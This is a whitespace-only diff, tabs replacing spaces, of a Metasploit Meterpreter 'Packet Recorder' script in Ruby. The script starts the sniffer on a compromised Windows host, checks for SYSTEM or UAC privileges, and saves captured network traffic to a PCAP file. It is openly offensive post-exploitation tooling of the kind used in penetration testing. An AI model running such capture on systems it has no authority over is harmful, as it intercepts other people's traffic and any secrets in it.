@@ -19,9 +19,9 @@ packtime = 30
 user = session.sys.config.getuid
 
 @@exec_opts = Rex::Parser::Arguments.new(
-        "-h"  => [ false,  "Help menu."],
-        "-t"  => [ true,  "Time interval in seconds between recollection of packet, default 30 seconds."],
-        "-i"  => [ true,  "Interface ID number where all packet capture will be done."]
+	"-h"  => [ false,  "Help menu."],
+	"-t"  => [ true,  "Time interval in seconds between recollection of packet, default 30 seconds."],
+	"-i"  => [ true,  "Interface ID number where all packet capture will be done."]
 	#"-b"  => [ false, "Background session after starting the recording of packets."]
 )
 
@@ -41,12 +41,12 @@ end
 
 #Function for Recording captured packets into PCAP file
 def packetrecord(session, packtime, logfile,intid)
-        begin
-                rec = 1
-                print_status("Packets being saved in to #{logfile}")
-                #Inserting Packets every number of seconds specified
-                print("[*] Recording .")
-                while rec == 1
+	begin
+		rec = 1
+		print_status("Packets being saved in to #{logfile}")
+		#Inserting Packets every number of seconds specified
+		print("[*] Recording .")
+		while rec == 1
 			path_cap = logfile
 			path_raw = logfile + '.raw'
 			fd = ::File.new(path_raw, 'wb+')
@@ -63,50 +63,50 @@ def packetrecord(session, packtime, logfile,intid)
 					bytes_pct = pct
 				end
 				break if res[:bytes] == 0
-                                fd.write(res[:data])
-                        end
+				fd.write(res[:data])
+			end
 
-                        fd.close
-                        #Converting raw file to PCAP
-                        fd = nil
-                        if(::File.exist?(path_cap))
-                                fd = ::File.new(path_cap, 'ab+')
-                        else
-                                fd = ::File.new(path_cap, 'wb+')
-                                fd.write([0xa1b2c3d4, 2, 4, 0, 0, 65536, 1].pack('NnnNNNN'))
-                        end
-                        pkts = {}
-                        od = ::File.new(path_raw, 'rb')
+			fd.close
+			#Converting raw file to PCAP
+			fd = nil
+			if(::File.exist?(path_cap))
+				fd = ::File.new(path_cap, 'ab+')
+			else
+				fd = ::File.new(path_cap, 'wb+')
+				fd.write([0xa1b2c3d4, 2, 4, 0, 0, 65536, 1].pack('NnnNNNN'))
+			end
+			pkts = {}
+			od = ::File.new(path_raw, 'rb')
 
-                        # TODO: reorder packets based on the ID (only an issue if the buffer wraps)
-                        while(true)
-                                buf = od.read(20)
-                                break if not buf
+			# TODO: reorder packets based on the ID (only an issue if the buffer wraps)
+			while(true)
+				buf = od.read(20)
+				break if not buf
 
-                                idh,idl,thi,tlo,len = buf.unpack('N5')
-                                break if not len
-                                if(len > 10000)
-                                        print_error("Corrupted packet data (length:#{len})")
-                                        break
-                                end
+				idh,idl,thi,tlo,len = buf.unpack('N5')
+				break if not len
+				if(len > 10000)
+					print_error("Corrupted packet data (length:#{len})")
+					break
+				end
 
-                                pkt_id = (idh << 32) +idl
-                                pkt_ts = Rex::Proto::SMB::Utils.time_smb_to_unix(thi,tlo)
-                                pkt    = od.read(len)
-                                fd.write([pkt_ts,0,len,len].pack('NNNN')+pkt)
-                        end
-                        od.close
-                        fd.close
+				pkt_id = (idh << 32) +idl
+				pkt_ts = Rex::Proto::SMB::Utils.time_smb_to_unix(thi,tlo)
+				pkt    = od.read(len)
+				fd.write([pkt_ts,0,len,len].pack('NNNN')+pkt)
+			end
+			od.close
+			fd.close
 
-                        ::File.unlink(path_raw)
-                        sleep(2)
-                        print(".")
-                        sleep(packtime.to_i)
+			::File.unlink(path_raw)
+			sleep(2)
+			print(".")
+			sleep(packtime.to_i)
 
-                end
+	end
 	rescue::Exception => e
 		print("\n")
-                print_status("#{e.class} #{e}")
+		print_status("#{e.class} #{e}")
 		print_status("Stopping Packet sniffer...")
 		session.sniffer.capture_stop(intid)
 	end
@@ -136,13 +136,13 @@ def checkuac(session)
 	return uac
 end
 def helpmsg
-        print(
-                "Packet Recorder Meterpreter Script\n" +
-                  "This script will start the Meterpreter Sniffer and save all packets\n" +
-                  "in a PCAP file for later analysis. To stop capture hit Ctrl-C\n" +
-                  "Usage:" +
-                  @@exec_opts.usage
-        )
+		print(
+				"Packet Recorder Meterpreter Script\n" +
+				  "This script will start the Meterpreter Sniffer and save all packets\n" +
+				  "in a PCAP file for later analysis. To stop capture hit Ctrl-C\n" +
+				  "Usage:" +
+				  @@exec_opts.usage
+		)
 
 end
 # Parsing of Options
@@ -150,27 +150,25 @@ helpcall = 0
 intid = 0
 background = 0
 @@exec_opts.parse(args) { |opt, idx, val|
-        case opt
-
+	case opt
 	when "-t"
-                packtime = val
+		packtime = val
 	when "-i"
-                intid = val.to_i
+		intid = val.to_i
 	when "-h"
-                helpmsg
-                helpcall = 1
-        end
-
+		helpmsg
+		helpcall = 1
+	end
 }
 if helpcall == 0
-        if (user != "NT AUTHORITY\\SYSTEM") && intid != 0
-                if not checkuac(session)
+	if (user != "NT AUTHORITY\\SYSTEM") && intid != 0
+		if not checkuac(session)
 			startsniff(session,intid)
-                        packetrecord(session,packtime,logfile,intid)
+			packetrecord(session,packtime,logfile,intid)
 		else 
 			print_line("[-] The Meterpreter process is not running as System and UAC is not enable, Insufficient Privileges to run")
-                end
-        elsif intid != 0
+		end
+	elsif intid != 0
 		startsniff(session,intid)
 		packetrecord(session,packtime,logfile,intid)
 	else
